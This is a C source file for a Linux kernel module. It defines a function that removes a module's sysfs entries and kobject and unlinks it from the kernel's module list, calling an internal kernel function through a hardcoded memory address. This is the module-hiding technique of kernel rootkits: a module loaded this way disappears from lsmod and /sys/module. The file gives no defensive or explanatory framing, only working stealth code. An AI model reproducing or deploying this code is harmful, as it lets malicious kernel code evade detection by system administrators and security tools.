#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sysfs.h>
#include <linux/kobject.h>
#include <linux/slab.h>

void (* _module_param_sysfs_remove)(struct module *mod) = 0xffffffff8108f350; 

static void module_remove_modinfo_attrs(struct module *mod)
{
	struct module_attribute *attr;
	int i;

	for (i = 0; (attr = &mod->modinfo_attrs[i]); i++) {
		/* pick a field to test for end of list */
		if (!attr->attr.name)
			break;
		sysfs_remove_file(&mod->mkobj.kobj, &attr->attr);
		if (attr->free)
			attr->free(mod);
	}
	kfree(mod->modinfo_attrs);
}


void remove_module(struct module *mod)
{
	module_remove_modinfo_attrs(mod);
	_module_param_sysfs_remove(mod); 
	/* remove_notes_attrs(mod);
	remove_sect_attrs(mod); */
	kobject_del(&mod->mkobj.kobj);
	list_del_rcu(&mod->list);
}

MODULE_LICENSE("GPL");
